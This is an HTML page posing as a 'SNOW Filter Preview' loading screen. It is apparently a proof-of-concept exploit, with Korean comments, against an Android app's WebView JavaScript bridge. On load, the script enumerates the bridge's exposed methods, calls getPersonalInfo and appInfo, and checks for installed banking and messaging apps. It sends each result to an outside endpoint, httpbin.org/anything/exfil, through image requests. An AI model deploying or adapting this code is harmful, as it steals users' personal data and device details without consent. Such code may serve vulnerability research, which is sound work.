<!DOCTYPE html>
<html>
<head>
    <title>SNOW Filter Preview</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body{font-family:-apple-system,sans-serif;padding:20px;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;margin:0}
        .container{max-width:500px;margin:0 auto;background:#fff;border-radius:20px;padding:30px;box-shadow:0 10px 40px rgba(0,0,0,.2)}
        h1{color:#333;text-align:center;font-size:20px}
        .status{padding:10px 15px;margin:8px 0;background:#f8f9fa;border-radius:8px;font-size:11px;word-break:break-all}
        .success{border-left:4px solid #4CAF50;background:#e8f5e9}
        .error{border-left:4px solid #f44336;background:#ffebee}
        .info{border-left:4px solid #2196F3;background:#e3f2fd}
        pre{background:#263238;color:#aed581;padding:10px;border-radius:5px;font-size:9px;overflow-x:auto;max-height:200px;white-space:pre-wrap}
    </style>
</head>
<body>
    <div class="container">
        <h1>🎭 Loading Filter...</h1>
        <div id="status"></div>
    </div>

    <script>
    // 실제 Bridge 이름: B612KajiBridgeInterface
    var Bridge = window.B612KajiBridgeInterface;

    function log(msg, type) {
        var div = document.createElement('div');
        div.className = 'status ' + (type || 'info');
        div.textContent = msg;
        document.getElementById('status').appendChild(div);
    }

    function sendToHttpbin(dataType, data) {
        var payload = encodeURIComponent(JSON.stringify({type: dataType, data: data}));
        var img = new Image();
        img.src = 'https://httpbin.org/anything/exfil?payload=' + payload;
        log('[EXFIL] ' + dataType, 'success');
    }

    function runExploit() {
        log('Checking for B612KajiBridgeInterface...', 'info');

        if (typeof B612KajiBridgeInterface === 'undefined') {
            log('B612KajiBridgeInterface NOT found', 'error');

            // 다른 가능한 이름들도 체크
            var possibleNames = ['AndroidBridge', 'B612Bridge', 'SnowBridge', 'KajiBridge', 'B612KajiBridge'];
            possibleNames.forEach(function(name) {
                if (typeof window[name] !== 'undefined') {
                    log('Found alternative: ' + name, 'success');
                }
            });

            document.querySelector('h1').textContent = '❌ Bridge Not Found';
            return;
        }

        Bridge = B612KajiBridgeInterface;
        log('✅ B612KajiBridgeInterface FOUND!', 'success');
        document.querySelector('h1').textContent = '✅ Exploiting...';

        // 1. 노출된 메소드 목록
        var methods = [];
        for (var p in Bridge) {
            if (typeof Bridge[p] === 'function') methods.push(p);
        }
        log('Found ' + methods.length + ' exposed methods', 'success');
        sendToHttpbin('exposedMethods', methods);

        // 메소드 목록 표시
        var pre = document.createElement('pre');
        pre.textContent = 'Methods:\n' + methods.join('\n');
        document.getElementById('status').appendChild(pre);

        // 2. Personal Info 탈취
        window.personalInfoCB = function(data) {
            var d = typeof data === 'string' ? JSON.parse(data) : data;
            log('Personal Info Retrieved!', 'success');
            sendToHttpbin('personalInfo', d);
            var pre = document.createElement('pre');
            pre.textContent = 'Personal Info:\n' + JSON.stringify(d, null, 2);
            document.getElementById('status').appendChild(pre);
        };
        try {
            Bridge.getPersonalInfo('personalInfoCB');
        } catch(e) {
            log('getPersonalInfo error: ' + e, 'error');
        }

        // 3. App Info 탈취
        window.appInfoCB = function(data) {
            var d = typeof data === 'string' ? JSON.parse(data) : data;
            log('App Info Retrieved!', 'success');
            sendToHttpbin('appInfo', d);
        };
        try {
            Bridge.appInfo('appInfoCB');
        } catch(e) {
            log('appInfo error: ' + e, 'error');
        }

        // 4. Safe Area Info
        window.safeAreaCB = function(data) {
            sendToHttpbin('safeArea', data);
        };
        try {
            Bridge.getSafeAreaInsets('safeAreaCB');
        } catch(e) {}

        // 5. 설치된 앱 체크
        window.checkAppCB = function(data) {
            log('Installed app check: ' + JSON.stringify(data).substring(0,50), 'info');
            sendToHttpbin('installedApp', data);
        };
        var apps = ['com.kakao.talk','com.kakaobank.channel','com.toss.supertoss','com.nhn.android.search'];
        apps.forEach(function(pkg) {
            try {
                Bridge.checkAppInstalled('checkAppCB', JSON.stringify({package: pkg}));
            } catch(e) {}
        });
    }

    setTimeout(runExploit, 500);
    </script>
</body>
</html>
